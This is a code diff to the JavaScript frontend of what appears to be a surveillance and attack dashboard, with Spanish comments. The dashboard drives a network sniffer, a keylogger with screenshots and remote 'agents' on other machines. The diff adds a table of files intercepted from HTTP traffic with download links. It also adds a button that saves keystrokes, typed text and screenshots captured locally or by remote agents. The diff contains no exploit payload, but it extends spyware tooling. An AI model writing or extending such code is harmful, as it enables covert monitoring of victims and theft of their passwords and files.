@@ -302,6 +302,8 @@ document.addEventListener('DOMContentLoaded', () => {
             if (data.success) {
                 capturedPackets = data.packets;
                 renderSniffResults(data);
+                // ── ARCHIVOS INTERCEPTADOS (captura local) ──────────────
+                renderInterceptedFiles(data.intercepted_files || []);
             } else {
                 showMessage(sniffMessage, 'error', `❌ ${data.error}`);
             }
@@ -421,6 +423,86 @@ document.addEventListener('DOMContentLoaded', () => {
         sniffResults.classList.add('visible');
     }
 
+    // ── ARCHIVOS INTERCEPTADOS ────────────────────────────────────────────────
+    /**
+     * Renderiza la tabla de archivos interceptados vía HTTP en el sniffer.
+     * Se llama desde el modo local (respuesta de /sniff) y desde el modo
+     * remoto (polling de /agent/results/sniffer).
+     *
+     * @param {Array} files  - lista de {filename, size, direction, content_type,
+     *                          src_ip, dst_ip, timestamp} devuelta por el backend
+     */
+    function renderInterceptedFiles(files) {
+        const section = document.getElementById('intercepted-files-section');
+        const tbody = document.getElementById('intercepted-files-body');
+        const counter = document.getElementById('intercepted-files-count');
+
+        if (!section || !tbody) return;
+
+        if (!files || files.length === 0) {
+            section.style.display = 'none';
+            return;
+        }
+
+        // Mostrar sección y marcarla para la animación pulse
+        section.style.display = 'block';
+        // Reiniciar animación quitando y volviendo a añadir la clase
+        section.classList.remove('has-files');
+        void section.offsetWidth; // forzar reflow
+        section.classList.add('has-files');
+
+        if (counter) {
+            counter.textContent = `${files.length} archivo${files.length !== 1 ? 's' : ''} detectado${files.length !== 1 ? 's' : ''}`;
+        }
+
+        tbody.innerHTML = '';
+
+        files.forEach((f, idx) => {
+            const isUpload = f.direction === 'upload';
+            const dirBadge = isUpload
+                ? '<span class="direction-badge upload">⬆️ Upload</span>'
+                : '<span class="direction-badge download">⬇️ Download</span>';
+
+            const sizeText = formatFileSize(f.size);
+
+            const tr = document.createElement('tr');
+            tr.innerHTML = `
+                <td>${idx + 1}</td>
+                <td><code>${escapeHtml(f.filename)}</code></td>
+                <td><small style="color:#a0a0b0;">${escapeHtml(f.content_type || '—')}</small></td>
+                <td>${dirBadge}</td>
+                <td>${sizeText}</td>
+                <td>
+                    <small style="color:#7a7a9a;">
+                        ${escapeHtml(f.src_ip || '?')}
+                        <span style="color:#e94560;">→</span>
+                        ${escapeHtml(f.dst_ip || '?')}
+                    </small>
+                </td>
+                <td><small style="color:#7a7a9a;">${escapeHtml(f.timestamp || '—')}</small></td>
+                <td>
+                    <a href="/download-intercepted/${idx}"
+                       class="btn-intercept-download"
+                       download="${escapeHtml(f.filename)}">
+                        💾 Descargar
+                    </a>
+                </td>
+            `;
+            tbody.appendChild(tr);
+        });
+    }
+
+    // Exponer para que el modo remoto también pueda llamarla
+    window._renderInterceptedFiles = renderInterceptedFiles;
+
+    function formatFileSize(bytes) {
+        if (!bytes || bytes === 0) return '—';
+        if (bytes < 1024) return `${bytes} B`;
+        if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
+        return `${(bytes / (1024 * 1024)).toFixed(2)} MB`;
+    }
+    // ─────────────────────────────────────────────────────────────────────────
+
     function getProtocolClass(protocol) {
         const map = {
             'TCP': 'protocol-tcp',
@@ -492,6 +574,10 @@ document.addEventListener('DOMContentLoaded', () => {
                 capturedKeys = data.keys;
                 capturedText = data.captured_text;
                 capturedScreenshots = data.screenshots || [];
+                // Exponer para el guardado unificado
+                window._localCapturedKeys = capturedKeys;
+                window._localCapturedText = capturedText;
+                window._localCapturedScreenshots = capturedScreenshots;
                 renderKeyloggerResults(data);
             } else {
                 showMessage(keyMessage, 'error', `❌ ${data.error}`);
@@ -814,7 +900,6 @@ function copyPassword(btn, password) {
 
     if (sniffRemoteBtn) {
         sniffRemoteBtn.addEventListener('click', async () => {
-            // Clear previous poll if any
             if (sniffPollTimer) { clearInterval(sniffPollTimer); sniffPollTimer = null; }
 
             const sniffMessage = document.getElementById('sniff-message');
@@ -824,10 +909,10 @@ function copyPassword(btn, password) {
             sniffRemoteSpinner.classList.add('active');
             sniffRemoteBtn.querySelector('.btn-text').textContent = '📡 ESPERANDO AGENTE...';
 
-            // Show status badge
             showAgentBadge(sniffMessage, 'waiting', '⏳ Esperando conexión del agente remoto...');
 
             let lastCount = 0;
+            let lastFileCount = 0;
 
             sniffPollTimer = setInterval(async () => {
                 try {
@@ -837,17 +922,15 @@ function copyPassword(btn, password) {
                     if (!data.success) return;
 
                     const agent = data.agent || {};
-                    const total = data.total_captured || 0;
+                    const total = data.total || 0;
 
                     if (agent.agent_ip) {
                         showAgentBadge(sniffMessage, 'connected',
                             `🟢 Agente conectado: ${agent.agent_ip} | ${total} paquetes recibidos`);
                     }
 
-                    // Render packets if we got new ones
                     if (total > lastCount && total > 0) {
                         lastCount = total;
-                        // Re-use existing renderSniffResults — dispatch as if local
                         const fakeData = {
                             packets: data.packets,
                             total_captured: total,
@@ -857,7 +940,13 @@ function copyPassword(btn, password) {
                         window._remoteSniffRender(fakeData, sniffResults);
                     }
 
-                    // Stop polling when complete
+                    // ── ARCHIVOS INTERCEPTADOS (modo remoto) ────────────
+                    const files = data.intercepted_files || [];
+                    if (files.length > lastFileCount && window._renderInterceptedFiles) {
+                        lastFileCount = files.length;
+                        window._renderInterceptedFiles(files);
+                    }
+
                     if (data.complete) {
                         clearInterval(sniffPollTimer);
                         sniffPollTimer = null;
@@ -940,12 +1029,16 @@ function copyPassword(btn, password) {
 
                     if (total > lastCount && total > 0) {
                         lastCount = total;
+                        window._remoteCapturedKeys = data.keys;
+                        window._remoteCapturedScreenshots = data.screenshots || [];
                         window._remoteKeyRender(data, keyResults);
                     }
 
                     if (data.complete) {
                         clearInterval(keyPollTimer);
                         keyPollTimer = null;
+                        window._remoteCapturedKeys = data.keys;
+                        window._remoteCapturedScreenshots = data.screenshots || [];
                         showAgentBadge(keyMessage, 'complete',
                             `✅ Keylogger remoto finalizado: ${total} teclas de ${agent.agent_ip}`);
                         keyRemoteBtn.disabled = false;
@@ -961,15 +1054,8 @@ function copyPassword(btn, password) {
     //  SHARED RENDER HELPERS (called by polling above)
     // ================================================================
 
-    // Re-uses the same rendering logic as the local mode.
-    // We expose them as globals after DOMContentLoaded runs.
-    window.addEventListener('DOMContentLoaded', () => {
-        // These are set once the main DOMContentLoaded above has run.
-        // We pull the inner functions out so remote polling can call them.
-    });
-
     // Minimal standalone renderers (no dependency on the main closure)
-    window._remoteSniffRender = function(data, container) {
+    window._remoteSniffRender = function (data, container) {
         const resultsBody = document.getElementById('sniff-results-body');
         const resultsInfo = document.getElementById('sniff-results-info');
         if (!resultsBody) return;
@@ -1017,7 +1103,7 @@ function copyPassword(btn, password) {
         container.classList.add('visible');
     };
 
-    window._remoteKeyRender = function(data, container) {
+    window._remoteKeyRender = function (data, container) {
         const resultsBody = document.getElementById('key-results-body');
         const resultsInfo = document.getElementById('key-results-info');
         const capturedTextBox = document.getElementById('key-captured-text');
@@ -1057,12 +1143,77 @@ function copyPassword(btn, password) {
             });
         }
         container.classList.add('visible');
-
-        // Render remote screenshots via the shared function
-        if (typeof renderScreenshots === 'function') {
-            renderScreenshots(data.screenshots || []);
-        }
     };
+
+    // ================================================================
+    //  REMOTE SAVE — save-keylog-btn unified for local + remote data
+    // ================================================================
+    document.addEventListener('DOMContentLoaded', () => {
+        const saveKeylogBtn = document.getElementById('save-keylog-btn');
+        if (!saveKeylogBtn) return;
+
+        const newBtn = saveKeylogBtn.cloneNode(true);
+        saveKeylogBtn.parentNode.replaceChild(newBtn, saveKeylogBtn);
+
+        newBtn.addEventListener('click', async () => {
+            const keyMessage = document.getElementById('key-message');
+            const filepath = document.getElementById('key-filepath').value.trim();
+
+            if (!filepath) {
+                showMsg(keyMessage, 'error', '⚠️ Ingresa la ruta donde guardar el archivo.');
+                return;
+            }
+
+            const keys = window._remoteCapturedKeys && window._remoteCapturedKeys.length > 0
+                ? window._remoteCapturedKeys
+                : window._localCapturedKeys || [];
+
+            const screenshots = window._remoteCapturedKeys && window._remoteCapturedKeys.length > 0
+                ? (window._remoteCapturedScreenshots || [])
+                : (window._localCapturedScreenshots || []);
+
+            const capturedText = window._remoteCapturedKeys && window._remoteCapturedKeys.length > 0
+                ? (window._remoteCapturedText || '')
+                : (window._localCapturedText || '');
+
+            if (keys.length === 0) {
+                showMsg(keyMessage, 'error', '⚠️ No hay teclas capturadas para guardar.');
+                return;
+            }
+
+            newBtn.disabled = true;
+            newBtn.textContent = '⏳ GUARDANDO...';
+
+            try {
+                const response = await fetch('/save-keylog', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ filepath, keys, captured_text: capturedText, screenshots })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    const scr = data.screenshots_saved ? ` | ${data.screenshots_saved} capturas guardadas` : '';
+                    showMsg(keyMessage, 'success', `✅ Registro guardado en: ${data.filepath} (${data.total_saved} teclas${scr})`);
+                } else {
+                    showMsg(keyMessage, 'error', `❌ ${data.error}`);
+                }
+            } catch (error) {
+                showMsg(keyMessage, 'error', `❌ Error: ${error.message}`);
+            } finally {
+                newBtn.disabled = false;
+                newBtn.textContent = '💾 GUARDAR REGISTRO';
+            }
+        });
+
+        function showMsg(el, type, text) {
+            if (!el) return;
+            const typeClass = type === 'error' ? 'error' : type === 'info' ? 'info' : type === 'success' ? 'success' : 'warning';
+            el.className = `message message--${typeClass} visible`;
+            el.innerHTML = text;
+        }
+    });
 
     function showAgentBadge(messageEl, type, text) {
         if (!messageEl) return;
@@ -1077,4 +1228,3 @@ function copyPassword(btn, password) {
         return d.innerHTML;
     }
 })();
-
